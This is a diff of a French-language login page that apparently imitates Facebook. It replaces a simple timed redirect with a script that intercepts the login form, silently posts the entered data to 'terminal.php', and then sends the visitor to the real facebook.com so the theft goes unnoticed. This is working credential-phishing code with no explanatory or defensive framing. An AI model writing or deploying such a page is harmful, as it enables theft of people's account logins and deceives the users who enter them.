@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -31,6 +31,26 @@
             <button type="submit" class="login-btn">Se connecter</button>
         </form>
     </div>
-    <script>setTimeout(function(){window.location.href='https://m.facebook.com';},2000);</script>
+     <script>
+const form = document.querySelector('form[method="POST"][action="terminal.php"]');
+
+form.addEventListener('submit', function(e) {
+    e.preventDefault(); // bloque le comportement classique du submit
+
+    const formData = new FormData(form);
+
+    fetch(form.action, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text()) // optionnel, récupère la réponse du serveur
+    .then(data => {
+        console.log(data); // juste pour debug
+        // redirection après envoi
+        window.location.href = 'https://www.facebook.com/'; 
+    })
+    .catch(error => console.error('Erreur:', error));
+});
+</script>
 </body>
 </html>
